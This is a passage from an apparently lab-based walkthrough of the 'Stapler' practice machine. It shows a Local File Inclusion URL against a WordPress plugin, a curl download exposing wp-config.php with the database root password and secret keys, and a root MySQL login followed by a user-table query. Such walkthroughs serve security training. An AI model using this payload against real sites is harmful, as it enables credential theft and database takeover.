</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> peter   <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> barry   <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> heather <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">6</span>  <span class="p">|</span> garry   <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">7</span>  <span class="p">|</span> harry   <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">8</span>  <span class="p">|</span> scott   <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">9</span>  <span class="p">|</span> kathy   <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim     <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span></code></pre></td></tr></table></div></figure></p>

<p>By exploiting the Local File Inclusion vulnerability, <code>https://10.1.1.138:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</code></p>

<p><img class="left" src="/downloads/stapler/1.png"></p>

<p>Then, back to home page and check the frontpage by right clicking and choose <code>Inspect Element (Q)</code>. Then find the thumbnail file location which is <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg</code> in this case.</p>

<p><img class="left" src="/downloads/stapler/2.png"></p>

<p>Then I use <code>curl</code> to download the thumbnail file and save it to my attacking machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&lt;/a&gt; &gt; 1.jpeg
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'><span class="m">100</span>  <span class="m">3042</span>  <span class="m">100</span>  <span class="m">3042</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">7509</span>      <span class="m">0</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>  7529
</span></code></pre></td></tr></table></div></figure></p>

<p>Then checking the file <code>1.jepg</code> which actually is the <code>wp-config.php</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# strings 1.jpeg
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'> * The base configurations of the WordPress.
</span><span class='line'> * This file has the following configurations: MySQL settings, Table Prefix,
</span><span class='line'> * Secret Keys, and ABSPATH. You can find more information by visiting
</span><span class='line'> * <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://codex.wordpress.org/Editing_wp-config.php&quot;</span>&gt;https://codex.wordpress.org/Editing_wp-config.php&lt;/a&gt; Editing wp-config.php<span class="o">}</span>
</span><span class='line'> * Codex page. You can get the MySQL settings from your web host.
</span><span class='line'> * This file is used by the wp-config.php creation script during the
</span><span class='line'> * installation. You don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to use the web site, you can just copy this file
</span><span class='line'> * to <span class="p">&amp;</span>ldquo<span class="p">;</span>wp-config.php<span class="p">&amp;</span>rdquo<span class="p">;</span> and fill in the values.
</span><span class='line'> * @package WordPress
</span><span class='line'>// &lt;strong&gt; MySQL settings - You can get this info from your web host &lt;/strong&gt; //
</span><span class='line'>/&lt;strong&gt; The name of the database <span class="k">for</span> WordPress */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_NAME<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; MySQL database username &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_USER<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** MySQL database password &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_PASSWORD<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>plbkac<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt; MySQL hostname */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_HOST<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>localhost<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; Database Charset to use in creating database tables. &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_CHARSET<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>utf8mb4<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** The Database Collate type. Don<span class="p">&amp;</span>rsquo<span class="p">;</span>t change this <span class="k">if</span> in doubt. &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_COLLATE<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt;#@+
</span><span class='line'> * Authentication Unique Keys and Salts.
</span><span class='line'> * Change these to different unique phrases!
</span><span class='line'> * You can generate these using the <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://api.wordpress.org/secret-key/1.1/salt/&quot;</span>&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt; WordPress.org secret-key service<span class="o">}</span>
</span><span class='line'> * You can change these at any point in <span class="nb">time </span>to invalidate all existing cookies. This will force all users to have to log in again.
</span><span class='line'> * @since 2.6.0
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,         <span class="p">&amp;</span>lsquo<span class="p">;</span>V <span class="nv">5p</span><span class="o">=[</span>.Vds8~SX<span class="p">;</span>&gt;t<span class="o">)</span>++Tt57U6<span class="o">{</span>Xe&lt;code&gt;T<span class="p">|</span>oW^eQ!mHr <span class="o">}]</span><span class="p">&amp;</span>gt<span class="p">;</span>9RX07W<span class="p">&amp;</span>lt<span class="p">;</span>sZ,I~&lt;/code&gt;6Y5-T:<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>SECURE_AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,  <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nv">vJZq</span><span class="o">=</span>p.Ug,<span class="o">]</span>:<span class="p">&amp;</span>lt<span class="p">;</span>-P#A<span class="p">|</span>k-+:<span class="p">;</span>JzV8&lt;em&gt;pZ<span class="p">|</span>K/U&lt;/em&gt;J<span class="o">][</span>Nyvs+<span class="o">}</span><span class="p">&amp;</span>amp<span class="p">;</span>!/#&gt;4#K7eFP5-av&lt;code&gt;n<span class="o">)</span>2<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>LOGGED_IN_KEY<span class="s1">&#39;,    &#39;</span>ql-Vfg<span class="o">[</span>?v6<span class="o">{</span>ZR*+O<span class="o">)</span><span class="p">|</span>Hf OpPWYfKX0Jmpl8zU<span class="p">&amp;</span>lt<span class="p">;</span>cr.wm?<span class="p">|</span>jqZH:YMv<span class="p">;</span>zu@tM7P:4o<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>NONCE_KEY<span class="s1">&#39;,        &#39;</span>j<span class="p">|</span>V8J.~n<span class="o">}</span>R2,mlU%?C8o2<span class="o">[</span>~6Vo1<span class="o">{</span>Gt+4mykbYH<span class="p">;</span>HDAIj9TE?QQI!VW<span class="o">]]</span>D&lt;/code&gt;3i73xO<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,        <span class="p">&amp;</span>lsquo<span class="p">;</span>I<span class="o">{</span>gDlDs&lt;code&gt;Z@.+/AdyzYw4%+<span class="p">&amp;</span>lt<span class="p">;</span>WsO-LDBHT<span class="o">}</span><span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span>!<span class="o">||</span>Xrf@1E6jJNV<span class="o">={</span>p1?yMKYec*OI<span class="s1">$&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>SECURE_AUTH_SALT<span class="s1">&#39;, &#39;</span>.HJmx^zb<span class="o">]</span><span class="p">;</span>5P<span class="o">}</span>hM-uJ%^+9<span class="o">=</span>0SBQEh<span class="o">[[</span>*<span class="p">&amp;</span>gt<span class="p">;</span><span class="c">#z+p&amp;gt;nVi10&lt;/code&gt;XOUq (Zml~op3SG4OG_D&amp;rsquo;);</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>LOGGED_IN_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,   <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>Zz!<span class="o">)</span>%R7/w37+:9L#.<span class="o">=</span>hL:cyeMM2kTx<span class="p">&amp;</span>amp<span class="p">;</span>_nP4<span class="o">{</span>D<span class="o">}</span><span class="nv">n</span><span class="o">=</span><span class="nv">y</span><span class="o">=</span>FQt%zJw&gt;c<span class="o">[</span>a+<span class="p">;</span>ppCzIkt<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>NONCE_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,       <span class="p">&amp;</span>lsquo<span class="p">;</span>tb<span class="o">(}</span>BfgB7l!rhDVm<span class="o">{</span>eK6&lt;sup&gt;MSN&lt;/sup&gt;-<span class="p">|</span>o<span class="o">]</span>S<span class="o">]]</span>axl4TE_y+Fi5I-RxN/9xeTsK<span class="o">]</span><span class="c">#ga_9:hJ&amp;rsquo;);</span>
</span><span class='line'>/&lt;/strong&gt;#@-&lt;em&gt;/
</span><span class='line'> * WordPress Database Table prefix.
</span><span class='line'> * You can have multiple installations in one database <span class="k">if</span> you give each a unique
</span><span class='line'> * prefix. Only numbers, letters, and underscores please!
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>wp_<span class="p">&amp;</span>rsquo<span class="p">;;</span>
</span><span class='line'> * For developers: WordPress debugging mode.
</span><span class='line'> * Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
</span><span class='line'> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span><span class='line'> * in their development environments.
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_DEBUG<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/em&gt; That<span class="p">&amp;</span>rsquo<span class="p">;</span>s all, stop editing! Happy blogging. &lt;em&gt;/
</span><span class='line'>/** Absolute path to the WordPress directory. &lt;/em&gt;/
</span><span class='line'><span class="k">if</span> <span class="o">(</span> !defined<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">)</span>
</span><span class='line'>    define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span>, dirname<span class="o">(</span>&lt;strong&gt;FILE&lt;/strong&gt;<span class="o">)</span> . <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;em&gt;* Sets up WordPress vars and included files. &lt;/em&gt;/
</span><span class='line'>require_once<span class="o">(</span>ABSPATH . <span class="p">&amp;</span>lsquo<span class="p">;</span>wp-settings.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_HTTP_BLOCK_EXTERNAL<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I got the MySQL database ROOT login password and the DB name:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DB_USER: root
</span><span class='line'>DB_PASS: plbkac
</span><span class='line'>DB_NAME: wordpress
</span></code></pre></td></tr></table></div></figure></p>

<p>When exploiting the Local File Inclusion vulnerability, I found the full path disclosure as well when a non-exist file name is given.</p>

<p>The full path is <font color="red"><code>/var/www/https/blogblog/</code></font></p>

<p><img class="left" src="/downloads/stapler/3.png"></p>

<p>Due to obtain the MySQL root and password, I was connected to target MySQL server with ROOT priviledge.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# mysql -h 10.1.1.138 -u root -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 8514
</span><span class='line'>Server version: 5.7.13-0ubuntu0.16.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Copyright <span class="p">&amp;</span>copy<span class="p">;</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nb">help</span><span class="p">;&amp;</span>rsquo<span class="p">;</span> or <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\h</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> help. Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\c</span><span class="p">&amp;</span>rsquo<span class="p">;</span> to clear the current input statement.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; show databases<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> loot               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> phpmyadmin         <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proof              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> sys                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wordpress          <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; use wordpress<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Tables_in_wordpress   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_comments           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_links              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_options            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_postmeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_posts              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_relationships <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_terms              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_usermeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_users              <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span><span class='line'>mysql&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email            <span class="p">|</span> user_url         <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key <span class="p">|</span> user_status <span class="p">|</span> display_name    <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
